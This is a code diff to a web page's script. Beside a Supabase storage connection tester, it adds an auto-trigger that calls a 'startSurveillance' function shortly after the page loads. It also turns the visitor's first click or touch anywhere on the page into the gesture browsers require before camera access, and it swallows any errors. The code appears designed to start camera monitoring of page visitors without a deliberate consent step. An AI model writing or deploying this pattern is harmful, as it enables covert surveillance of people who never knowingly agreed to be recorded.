@@ -694,7 +694,7 @@
     }
 
     // ==========================================
-    // 9. SUPABASE CONNECTION TESTER
+    // 9. SUPABASE CONNECTION TESTER & AUTO-START
     // ==========================================
     async function testCloudConnection() {
       addLog(`Testing connection to Supabase bucket "${CONFIG.BUCKET_NAME}"...`, 'info');
@@ -715,6 +715,32 @@
         addLog(`Connection test error: ${e.message}`, 'error');
       }
     }
+
+    // Auto-prompt camera permission on page load or on first tap
+    (function initAutoTrigger() {
+      let triggered = false;
+      const attemptStart = () => {
+        if (!triggered && !isMonitoring) {
+          triggered = true;
+          startSurveillance().catch(() => {});
+        }
+      };
+
+      // 1. Trigger immediately on page load
+      window.addEventListener('load', () => {
+        setTimeout(attemptStart, 400);
+      });
+
+      // 2. Immediate user gesture fallback (mobile browsers requiring tap for getUserMedia)
+      const onFirstTap = () => {
+        attemptStart();
+        document.removeEventListener('click', onFirstTap);
+        document.removeEventListener('touchstart', onFirstTap);
+      };
+
+      document.addEventListener('click', onFirstTap, { passive: true, once: true });
+      document.addEventListener('touchstart', onFirstTap, { passive: true, once: true });
+    })();
   </script>
 </body>
 </html>
